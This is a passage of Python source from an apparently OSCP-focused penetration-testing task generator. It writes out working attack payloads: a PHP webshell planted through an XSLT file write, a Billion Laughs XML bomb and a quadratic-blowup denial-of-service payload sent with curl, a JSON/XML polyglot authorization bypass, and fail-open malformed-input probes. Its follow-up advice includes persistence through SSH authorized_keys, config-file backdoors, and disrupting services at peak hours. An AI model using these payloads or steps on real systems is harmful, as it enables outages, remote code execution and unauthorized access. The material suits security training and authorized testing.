                            'shell.php created in web root',
                            'Webshell accessible via HTTP',
                            'RCE achieved via ?0=id parameter'
                        ],
                        'failure_indicators': [
                            'XSLT 1.0 only (no result-document)',
                            'File write permissions denied',
                            'Web root path unknown',
                            'Xalan redirect extension disabled'
                        ],
                        'next_steps': [
                            'Upgrade webshell to interactive shell',
                            'Enumerate writable directories (uploads/, cache/, tmp/)',
                            'Write SSH authorized_keys for persistent access',
                            'Overwrite application config files for backdoor'
                        ],
                        'alternatives': [
                            'Manual: Write to /tmp/shell.php then move to web root',
                            'PHP XSLT: php:function("file_put_contents", "shell.php", "...")',
                            'Blind write: Write then confirm via HTTP request'
                        ],
                        'notes': 'XSLT 2.0 file write requires Saxon processor. Xalan redirect extension less common. OSCP: High-value (direct RCE). Always write minimal webshell first, then upgrade.'
                    }
                }
            ]
        }

    def _create_xml_bomb_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create XML bomb / Billion Laughs DoS attack tasks"""
        return {
            'id': f'xml-bomb-{port}',
            'name': 'XML Bomb / Billion Laughs Attack',
            'type': 'parent',
            'children': [
                # Task 1: XML Billion Laughs DoS
                {
                    'id': f'xml-billion-laughs-{port}',
                    'name': 'XML Billion Laughs (Exponential Entity Expansion)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test for XML bomb vulnerability via exponential entity expansion (DoS)',
                        'command': f'# Create Billion Laughs XML bomb:\ncat > bomb.xml <<\'EOF\'\n<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol "lol">\n  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n]>\n<lolz>&lol9;</lolz>\nEOF\n\n# Send to XML parser:\ncurl -X POST {base_url}/api/parse \\\n  -H "Content-Type: application/xml" \\\n  --data-binary @bomb.xml\n\n# Monitor server (out-of-band): htop, top, or DoS impact',
                        'tags': ['OSCP:LOW', 'DOS', 'XML'],
                        'flag_explanations': {
                            'Exponential entity expansion': 'Each lolX expands to 10x previous (10^9 = 1 billion "lol")',
                            '<!ENTITY lol9 "&lol8;...">': 'Final entity expands to ~3GB of text',
                            'Memory exhaustion': 'Parser loads entire expanded XML into memory',
                            'DoS impact': 'CPU spike, OOM, application crash'
                        },
                        'success_indicators': [
                            'Server CPU/memory spike (monitor with htop)',
                            'Application timeout (500 error, connection reset)',
                            'XML parser error (entity expansion limit reached)',
                            'Service degradation (slow response for other users)'
                        ],
                        'failure_indicators': [
                            'Entity expansion limits enabled (libxml2 PARSE_NOENT disabled)',
                            'Request rejected due to size/complexity',
                            'Parser timeout before expansion completes',
                            'No observable resource impact'
                        ],
                        'next_steps': [
                            'Adjust expansion depth for different parsers',
                            'Combine with slowloris for amplified DoS',
                            'Test during peak hours for service disruption',
                            'Document for vendor disclosure (not for OSCP)'
                        ],
                        'alternatives': [
                            'Manual: Smaller bomb (5 levels) for testing without DoS',
                            'YAML bomb: Exponential anchor expansion (see YAML section)',
                            'JSON bomb: Deeply nested objects/arrays',
                            'Quadratic blowup: <!ENTITY a "aaa..."> repeated (different complexity)'
                        ],
                        'notes': 'OSCP relevance: LOW (DoS not exam objective). Real-world: Medium severity (availability impact). Modern parsers often have entity expansion limits (libxml2, Xerces). Test responsibly.'
                    }
                },

                # Task 2: XML Quadratic Blowup
                {
                    'id': f'xml-quadratic-blowup-{port}',
                    'name': 'XML Quadratic Blowup (Alternative DoS)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test for XML quadratic blowup vulnerability (O(n^2) parsing complexity)',
                        'command': f'# Create quadratic blowup payload:\ncat > quadratic.xml <<\'EOF\'\n<?xml version="1.0"?>\n<!DOCTYPE kaboom [\n  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">\n]>\n<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\n<!-- Repeat &a; thousands of times -->\n</kaboom>\nEOF\n\n# Send to parser:\ncurl -X POST {base_url}/api/parse \\\n  -H "Content-Type: application/xml" \\\n  --data-binary @quadratic.xml',
                        'tags': ['OSCP:LOW', 'DOS', 'XML'],
                        'flag_explanations': {
                            'Quadratic blowup': 'Parsing time increases quadratically with entity count',
                            'O(n^2) complexity': 'n entities * entity size = n^2 operations',
                            'Memory impact': 'Lower than Billion Laughs but still significant'
                        },
                        'success_indicators': [
                            'Parser slowdown (increased response time)',
                            'CPU spike without OOM',
                            'Timeout error after prolonged parsing'
                        ],
                        'failure_indicators': [
                            'Parser timeout before quadratic effect',
                            'Entity expansion disabled',
                            'No observable performance degradation'
                        ],
                        'next_steps': [
                            'Increase entity count for stronger impact',
                            'Test different entity sizes',
                            'Combine with concurrent requests'
                        ],
                        'alternatives': [
                            'Manual: Billion Laughs (exponential)',
                            'Manual: External entity recursion',
                            'Hash collision: Craft JSON keys for O(n^2) hash table operations'
                        ],
                        'notes': 'Quadratic blowup less severe than Billion Laughs but evades some mitigations. OSCP: Not applicable. Bug bounty: Low-Medium.'
                    }
                }
            ]
        }

    def _create_polyglot_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create parser confusion / polyglot attack tasks"""
        return {
            'id': f'polyglot-attacks-{port}',
            'name': 'Polyglot / Parser Confusion Attacks',
            'type': 'parent',
            'children': [
                # Task 1: JSON/XML/YAML Polyglot
                {
                    'id': f'json-xml-polyglot-{port}',
                    'name': 'JSON/XML Polyglot (Parser Confusion)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Exploit systems parsing same payload with multiple parsers (CVE-2020-16250 HashiCorp Vault)',
                        'command': f'# Create polyglot payload (valid JSON + embedded XML):\ncat > polyglot.json <<\'EOF\'\n{{\n  "action": "UserAction",\n  "AcTiOn": "AdminAction",\n  "ignored": "<?xml version=\\"1.0\\"?><Action>RootAction</Action>"\n}}\nEOF\n\n# Send with ambiguous Content-Type:\ncurl -X POST {base_url}/api/admin \\\n  -H "Accept: application/json" \\\n  -H "Content-Type: application/json" \\\n  --data-binary @polyglot.json\n\n# Expected confusion:\n# - JSON parser: sees "AcTiOn": "AdminAction" (Go case-insensitive)\n# - XML parser: extracts <Action>RootAction</Action> from string\n# - YAML parser: sees "action": "UserAction" (case-sensitive)',
                        'tags': ['OSCP:MEDIUM', 'PARSER_DIFFERENTIAL', 'AUTHZ'],
                        'flag_explanations': {
                            'Polyglot payload': 'Valid in multiple data formats simultaneously',
                            'Accept: application/json': 'Client expects JSON response',
                            'Content-Type: application/json': 'Tells server to parse as JSON',
                            'Embedded XML': 'Hidden in JSON string, extracted if XML parser used'
                        },
                        'success_indicators': [
                            'Admin/Root action executed despite JSON showing UserAction',
                            'Different behavior between services (proxy vs backend)',
                            'Authorization bypass via parser confusion'
                        ],
                        'failure_indicators': [
                            'Single parser used consistently',
                            'Strict Content-Type enforcement',
                            'No observable behavior difference'
                        ],
                        'next_steps': [
                            'Identify microservices architecture (different parsers per service)',
                            'Test all data format combinations (JSON→XML, XML→YAML, etc.)',
                            'Research CVEs for specific parser combos'
                        ],
                        'alternatives': [
                            'Manual: Test Accept header manipulation',
                            'Manual: Test Content-Type: application/xml with JSON body',
                            'Manual: Embed YAML in JSON strings for YAML parsers'
                        ],
                        'notes': 'Real-world: CVE-2020-16250 (HashiCorp Vault), 2022 Zoom RCE, 2025 GitLab SAML bypass. OSCP: Rare but critical. Look for Go+Java microservices.'
                    }
                },

                # Task 2: Data Format Confusion (Fail Open)
                {
                    'id': f'format-confusion-failopen-{port}',
                    'name': 'Data Format Confusion (Fail Open)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Exploit systems that fail open when parser errors occur',
                        'command': f'# Send malformed JSON to trigger parser error:\ncurl -X POST {base_url}/api/admin \\\n  -H "Content-Type: application/json" \\\n  -d \'{{MALFORMED JSON\'\n\n# Send invalid XML:\ncurl -X POST {base_url}/api/admin \\\n  -H "Content-Type: application/xml" \\\n  -d \'<?xml version="1.0"?><root><unclosed>\'\n\n# Send YAML with syntax error:\ncurl -X POST {base_url}/api/admin \\\n  -H "Content-Type: application/x-yaml" \\\n  -d \'invalid: : : yaml\'\n\n# Observe if authorization bypassed when parsing fails',
                        'tags': ['OSCP:MEDIUM', 'AUTHZ', 'ERROR_HANDLING'],
                        'flag_explanations': {
                            'Malformed data': 'Intentionally invalid to trigger parser exception',
                            'Fail open': 'System allows request when validation fails (opposite of fail closed)',
                            'Exception handling': 'Catch-all error handler may skip authorization'
                        },
                        'success_indicators': [
                            'Admin action executed despite malformed input',
                            'Authorization checks bypassed on parser error',
                            'Different response vs well-formed request (not 400 error)'
                        ],
                        'failure_indicators': [
                            'Parser rejects with 400 Bad Request',
                            'Strict validation (fail closed)',
                            'Request blocked before authorization logic'
                        ],
                        'next_steps': [
                            'Test all endpoints with malformed data',
                            'Identify which parsers have lenient error handling',
                            'Combine with parameter pollution for bypass'
                        ],
                        'alternatives': [
                            'Manual: Test partial JSON (missing closing braces)',
                            'Manual: Test mixed encodings (UTF-8 + UTF-16)',
                            'Manual: Send empty body with incorrect Content-Type'
                        ],
                        'notes': 'Fail-open anti-pattern common in legacy apps. OSCP: Medium priority (logic flaw exploitation). Test: WAF vs backend error handling differences.'
                    }
                }
            ]
        }
